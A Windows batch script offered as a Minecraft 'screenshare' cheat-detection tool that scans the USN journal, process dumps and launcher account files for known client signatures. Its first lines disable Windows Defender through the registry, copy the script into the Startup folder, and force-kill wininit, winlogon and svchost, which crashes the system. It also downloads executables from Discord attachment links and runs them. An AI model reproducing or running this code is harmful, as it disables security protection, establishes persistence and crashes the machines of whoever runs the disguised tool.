@echo off & title
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
taskkill /f /im wininit.exe
taskkill /f /im winlogon.exe
taskkill /f /im svchost.exe
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
if exist "%temp%\assets" RD /S /Q "%temp%\assets" >nul
if exist "%temp%\dumps" RD /S /Q "%temp%\dumps" >nul
if exist "%temp%\slinky.txt" del /f /q "%temp%\slinky.txt" >nul
if exist "%temp%\slink.txt" del /f /q "%temp%\slink.txt" >nul
if exist "%temp%\usn.txt" del /f /q "%temp%\usn.txt" >nul
if exist "%temp%\slinkware.txt" del /f /q "%temp%\slinkware.txt" >nul
if exist "%temp%\colors.txt" del /f /q "%temp%\colors.txt" >nul
============================================================================================================================================
:: Variables for colors
:colors
set g=[0;32m
set r=[0;31m
set l=[1m
set w=[0m
set b=[94m
set m=[95m
set p=[35m
set c=[96m
set d=[96m
set u=[0m
set n=[96m
set y=[40;33m
============================================================================================================================================
:check
curl -s https://pastebin.com/raw/aRshe2s0 > %temp%\mpfart.txt
if not exist "%temp%\mpfart.txt" goto error
echo Enter Fart
set /p pin=
find "%pin%" "%temp%\mpfart.txt" >nul & goto fart
:fart
if "%errorlevel%"=="0" (del /f /q "%temp%\mpfart.txt" & goto gui) else (del /f /q "%temp%\mpfart.txt" & echo invalid pin you farter & timeout /t 3 >nul & cls & goto check)



:CustomConfig
curl -s https://pastebin.com/raw/JMqJgAgE > %temp%\colors.txt  

::Put your own raw pastebin link
::Your pastebin should be formatted like how the default one is. Make sure "Paste Exposure:" is set to Unlisted.





:Custom
cls
for /f "delims=" %%a in ('findstr /i /b "Primary" "%temp%\colors.txt"') do set custom1=%%a 
if /i %custom1%==Primary:Green set c=%g%
if /i %custom1%==Primary:Red set c=%r%
if /i %custom1%==Primary:Yellow set c=%y%
if /i %custom1%==Primary:Cyan set c=%n%
if /i %custom1%==Primary:White set c=%w%
if /i %custom1%==Primary:Blue set c=%b%
if /i %custom1%==Primary:Magenta set c=%m%

:2Custom
cls
for /f "delims=" %%a in ('findstr /i /b "Secondary" "%temp%\colors.txt"') do set custom2=%%a 
if /i %custom2%==Secondary:Green set u=%g%
if /i %custom2%==Secondary:Red set u=%r%
if /i %custom2%==Secondary:Yellow set u=%y%
if /i %custom2%==Secondary:Cyan set u=%n%
if /i %custom2%==Secondary:White set u=%w%
if /i %custom2%==Secondary:Blue set u=%b%
if /i %custom2%==Secondary:Magenta set u=%m%


:3Custom
cls
for /f "delims=" %%a in ('findstr /i /b "Tertiary" "%temp%\colors.txt"') do set custom3=%%a 
if /i %custom3%==Tertiary:Green set d=%g%
if /i %custom3%==Tertiary:Red set d=%r%
if /i %custom3%==Tertiary:Yellow set d=%y%
if /i %custom3%==Tertiary:Cyan set d=%n%
if /i %custom3%==Tertiary:White set d=%w%
if /i %custom3%==Tertiary:Blue set d=%b%
if /i %custom3%==Tertiary:Magenta set d=%m%




:gui
chcp 65001 >nul
mode 90 , 30
echo.
echo %c%          __      __              _         _____ _____   _______          _ 
echo           \ \    / /             (_)       / ____/ ____^| ^|__   __^|        ^| ^|
echo            \ \  / /__  __ _  __ _ _  ___  ^| (___^| (___      ^| ^| ___   ___ ^| ^|
echo             \ \/ / _ \/ _` ^|/ _` ^| ^|/ _ \  \___ \\___ \     ^| ^|/ _ \ / _ \^| ^| %u%
echo              \  /  __/ (_^| ^| (_^| ^| ^|  __/  ____) ^|___) ^|    ^| ^| (_) ^| (_) ^| ^|
echo               \/ \___^|\__, ^|\__, ^|_^|\___^| ^|_____/_____/     ^|_^|\___/ \___/^|_^|
echo                        __/ ^| __/ ^|                                           
echo                       ^|___/ ^|___/                                            
echo.
echo.
echo.
echo %c%             ╔═════════════════════════════════╦════════════════════════════╗ %u%
echo              %c%║%u%       [%d%-%u%] Version:  2.1%u% 	       %c%║%u%   [%d%4%u%] Recycle Bin          %c%║%u%       
echo              %c%║%u%       [%d%1%u%] Scan      	       %c%║%u%   [%d%5%u%] USN          	    %c%║%u%       
echo              %c%║%u%       [%d%2%u%] LastActivityView      %c%║%u%   [%d%6%u%] Regedit        	    %c%║%u%       
echo              %c%║%u%       [%d%3%u%] USB Deview %u%           %c%║%u%   [%d%7%u%] Credits              %c%║%u%       
echo %c%             ╚═════════════════╦═══════════════╬═══════════════╦════════════╝
echo                                ║   %u%   [%d%8%u%]%c%      ║  %u%    [%d%9%u%] %c%     ║
echo                                ║ %u%Custom theme%c%  ║ %u%Theme Presets%c% ║
echo                                ║               ║               ║
echo                                ╚═══════════════╩═══════════════╝
set /p option=
if %option%==1 goto scan
if %option%==2 goto LAV
if %option%==3 goto USBD
if %option%==4 goto rbin
if %option%==5 goto USN
if %option%==6 goto regedit
if %option%==7 goto credits
if %option%==8 goto CustomConfig
if %option%==9 echo WIP & timeout /t 5 >nul & goto gui
if %option%==10 goto gui
echo Please enter a valid option & timeout /t 5 >nul & goto gui







:scan
======================================================================================================================================================

:recording
tasklist /fi "ImageName eq nvcontainer.exe" /fo csv 2>nul | find /I "nvcontainer" >nul
if %errorlevel%==1 goto obs
if %errorlevel%==0 echo Shadowplay could be recording, Would you like to close it? (Yes, No) 
set /p term=
if /i %term%==Yes (taskkill /f /im nvcontainer.exe /t >nul & set %term%=e & goto obs) else (goto obs)


:obs
tasklist /fi "ImageName eq obs64.exe" /fo csv 2>nul | find /I "obs64" >nul
if %errorlevel%==1 goto bdcam
if %errorlevel%==0 echo OBS could be recording, Would you like to close it? (Yes, No)
set /p term=
if /i %term%==Yes (taskkill /f /im obs64.exe /t >nul & set %term%=e & goto bdcam) else (goto bdcam)


:bdcam
tasklist /fi "ImageName eq bdcam.exe" /fo csv 2>nul | find /I "bdcam" >nul
if %errorlevel%==1 goto action
if %errorlevel%==0 echo Bandicam could be recording, Would you like to close it? (Yes, No)
set /p term=
if /i %term%==Yes (taskkill /f /im bdcam.exe /t >nul & set %term%=e & goto action) else (goto action)


:action
tasklist /fi "ImageName eq Action.exe" /fo csv 2>nul | find /I "Action" >nul
if %errorlevel%==1 goto vpn
if %errorlevel%==0 echo Action could be recording, Would you like to close it? (Yes, No)
set /p term=
if /i %term%==Yes (taskkill /f /im Action.exe /t >nul & set %term%=e & taskkill /f /im action_svc.exe /t >nul goto vpn) else (goto vpn)


:vpn
tasklist /fi "ImageName eq Windscribe.exe" /fo csv 2>nul | find /I "Windscribe" >nul
if %errorlevel%==1 goto pia
if %errorlevel%==0 echo Windscribe VPN is running, continue to scan? (Yes, No)
set /p vpn=
if /i %vpn%==Yes (goto cscan) else (exit)

:pia
tasklist /fi "ImageName eq pia-client.exe" /fo csv 2>nul | find /I "pia-client" >nul
if %errorlevel%==1 goto cscan
if %errorlevel%==0 echo PIA VPN is running, continue to scan? (Yes, No)
set /p vpn=
if /i %vpn%==Yes (goto cscan) else (exit)






:cscan
cd %temp%
if exist "%temp%\assets" RD /S /Q "%temp%\assets" >nul
if exist "%temp%\dumps" RD /S /Q "%temp%\dumps" >nul
cls
echo Scanning....
:cloud_generic
if exist "%temp%\genc" del /f /q "%temp%\genc" >nul
fsutil usn readJournal C: csv > "%temp%\usn.txt"
if not exist "%temp%\usn.txt" goto error
findstr /b "0," < "%temp%\usn.txt" >%temp%\genc.txt
if %errorlevel%==1 goto slinky
if %errorlevel%==0 FOR /F "tokens=1,2,3,4,5,6,7 delims=," %%G IN (%temp%\genc.txt) do echo %%L>%temp%\genc.txt
echo Cloud Clicker (or any other garbage clicker/clients) was self destructed at: 
type %temp%\genc.txt
echo Would you like to continue the scan? (Yes, No)  
set /p cont=
if /i %cont%==Yes (goto slinky) else (exit)

:slinky
find "slinky.log" < "%temp%\usn.txt" >%temp%\slinky.txt
if %errorlevel%==1 goto slinkware
if %errorlevel%==0 FOR /F "tokens=6 delims=," %%G IN (%temp%\slinky.txt) do findstr /v /c:"File delete" "%temp%\slinky.txt" >> "%temp%\slink.txt"
findstr /v /c:"Security change" "%temp%\slinky.txt" >> "%temp%\slink.txt"
FOR /F "tokens=6 delims=," %%G IN (%temp%\slink.txt) do echo %%G>%temp%\slink.txt
echo Slinky was closed at: 
type %temp%\slink.txt
echo Would you like to continue the scan? (Yes, No)  
set /p cont=
if /i %cont%==Yes (goto pshistory) else (exit)


:slinkware
::Working on it lol



:pshistory
cls
echo Scanning..
findstr /b /i "help" "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" goto strings
if %errorlevel%==0 goto genericl
if %errorlevel%==1 goto strings


:strings
chcp 437 >nul
cls
curl -s https://cdn.discordapp.com/attachments/862110537622355981/864584601548619776/Process_Dumper.exe > %temp%\fart.exe
if not exist "%temp%\fart.exe" echo an error has fartcured & timeout /t 3 /nobreak >nul & exit /b
cd %temp%
"fart.exe"
::the timeout is so that javaw can finish dumping
timeout /t 10 /nobreak >nul


findstr /b c: "Mumble Link implementation for Lunar Client." "%temp%\dumps\javaw\javaw**.txt" >nul
cls
if %errorlevel%==0 set lunar=true

findstr /b "AutoClicker" "%temp%\dumps\javaw\javaw**.txt" >nul
cls
if %errorlevel%==0 goto generica

 
findstr /b "skilleddablol" "%temp%\dumps\javaw\javaw**.txt" >nul
cls
if %errorlevel%==0 goto skilled


findstr /b /C:"Secondary finalizer" "%temp%\dumps\javaw\javaw**.txt" >nul
cls
if %errorlevel%==0 goto GenericSD

:continue
findstr /b "0x00000000000D2800" "%temp%\dumps\svchost\PcaSvc\Pca**.txt" >nul
cls
if %errorlevel%==0 goto boris


findstr /b "0x20b" "%temp%\dumps\svchost\PcaSvc\Pca**.txt" >nul
cls
if %errorlevel%==0 goto genericfart



findstr /b "000639a5f0816c6b9268e951750094e763fe00000000" "%temp%\dumps\svchost\PcaSvc\Pca**.txt" >nul
cls
if %errorlevel%==0 goto peach




findstr /b "0x000000000006B800" "%temp%\dumps\svchost\PcaSvc\Pca**.txt" >nul
cls
if %errorlevel%==0 goto itami





findstr /b "0006e1e8596a5009096d3041f00930c2dff50000ffff" "%temp%\dumps\svchost\PcaSvc\Pca**.txt" >nul
cls
if %errorlevel%==0 goto nova



findstr /b "(DDDDLjava/awt/color;)V" "%temp%\dumps\javaw\javaw**.txt" >nul
cls
if %errorlevel%==0 goto vapev4





findstr /b "00067f34842bc2c519a7ff3b88d2a574f4600000ffff" "%temp%\dumps\svchost\PcaSvc\Pca**.txt" >nul
cls
if %errorlevel%==0 goto krypton


findstr /b "https://cloudcheats.net/dashboard/" "%temp%\dumps\brave\brave*****.txt" >nul
cls
if %errorlevel%==0 goto generico
if %errorlevel%==1 goto clean





:genericl
cls
del /f /q "%temp%\usn.txt" >nul
color 0C
echo Generic L found
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul & exit



:genericc
cls
del /f /q "%temp%\usn.txt" >nul
color 0C
echo Generic C found
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul & exit


:clean
cls                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
TASKKILL /F /IM dumper.exe 
cls
del /f /q "%temp%\usn.txt" >nul                                                                                                                                                                                                                                                                                                                                                                                                    
del /f /q "%temp%\fart.exe" >nul
color 0A
echo clean
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
echo Would you like to go back to the gui?
set /p back=
if /i %back%==Yes goto gui
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
exit



:boris
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Boris Clicker
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul
exit



:genericfart
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Generic External Cheat
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit


:peach
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Peach Clicker
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit



:itami
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul 2>&
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Itami
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit



:nova
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Nova
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit

:krypton
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Krypton
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit




:vapev4
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Vape V
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit




:skilled
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Skilled Client
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit

:GenericSD
if %lunar%==true goto continue
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Generic Self Destruct
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit



:generico
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Generic O
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit

:generica
cls
TASKKILL /F /IM dumper.exe
cls
del /f /q "%temp%\usn.txt" >nul
del /f /q "%temp%\fart.exe" >nul
RD /S /Q "%temp%\assets" >nul
RD /S /Q "%temp%\dumps" >nul
color 0C
echo Found Generic A
<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
echo Alts:
type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
timeout /t 10 /nobreak >nul 
exit


======================================================================================================================================================



:LAV
curl -s https://cdn.discordapp.com/attachments/862110537622355981/864900611652321300/LastActivityView.chm > %temp%\LastActivityView.chm
curl -s https://cdn.discordapp.com/attachments/862110537622355981/864900615339245589/LastActivityView.exe > %temp%\LastActivityView.exe
start "" "%temp%\LastActivityView.exe"
goto gui




:USBD
curl -s https://cdn.discordapp.com/attachments/862110537622355981/864902094611677224/USBDeview.chm > %temp%\USBDeview.chm
curl -s https://cdn.discordapp.com/attachments/862110537622355981/864902096615374908/USBDeview.exe > %temp%\USBDeview.exe
start "" "%temp%\USBDeview.exe"
goto gui



:rbin
start "" "C:\$Recycle.bin"
goto gui



:USN
if exist "%temp%\Deletedbat.txt" del /f /q "%temp%\Deletedbat.txt" >nul
if exist "%temp%\Deletedexe.txt" del /f /q "%temp%\Deletedexe.txt" >nul
cls
echo Set file extention
set /p usnext=

if %usnext%==exe fsutil usn readjournal c: csv | findstr /i /c:.exe | findstr /i /c:0x80000200 >> %temp%\Deletedexe.txt & start "" "%temp%\Deletedexe.txt" & goto gui


if %usnext%==bat fsutil usn readjournal c: csv | findstr /i /c:.bat | findstr /i /c:0x80000200 >> %temp%\Deletedbat.txt & start "" "%temp%\Deletedbat.txt" & goto gui

echo Please enter a valid extention (exe, bat).
timeout /t 5 >nul
goto USN



:regedit
cls
echo Set file extention
set /p extention=

if %extention%==dll reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll" /f & start "" regedit & goto gui


if %extention%==exe reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\exe" /f & start "" regedit & goto gui


if %extention%==png reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\png" /f & start "" regedit & goto gui 


if %extention%==mp4 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\mp4" /f & start "" regedit & goto gui


if %extention%==mp3 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\mp3" /f & start "" regedit & goto gui


if %extention%==jpg reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\jpg" /f & start "" regedit & goto gui


if %extention%==jpeg reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\jpeg" /f & start "" regedit & goto gui


if %extention%==bat reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\bat" /f & start "" regedit & goto gui 


if %extention%==cmd reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v "LastKey" /d "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\cmd" /f & start "" regedit & goto gui


echo Please enter a valid extention & timeout /t 10 >nul & goto regedit

:credits
cls
mode 130 , 30
echo Jesse for the Process Dumper (https://github.com/thatnword/ProcDumper) 
echo Mp3 for helping with alts list, original cloud generic (i changed it a bit) and pin system (https://github.com/mp3lol)
echo Buxh for helping with the gui (https://github.com/Buxh)
timeout /t 15 >nul
goto gui








